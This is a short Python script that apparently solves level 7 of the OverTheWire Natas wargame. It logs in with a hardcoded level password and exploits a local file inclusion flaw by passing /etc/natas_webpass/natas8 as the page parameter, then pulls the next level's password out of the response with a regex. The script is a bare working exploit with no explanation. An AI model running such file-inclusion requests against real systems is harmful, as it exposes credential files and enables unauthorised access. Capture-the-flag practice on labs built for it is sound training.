import requests as req
import re



username="natas7"
password='bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'

url="http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" % username

response=req.get(url,auth=(username,password))

print(re.findall("<br>\n(.*)\n\n<!-- hint:",response.text)[0])


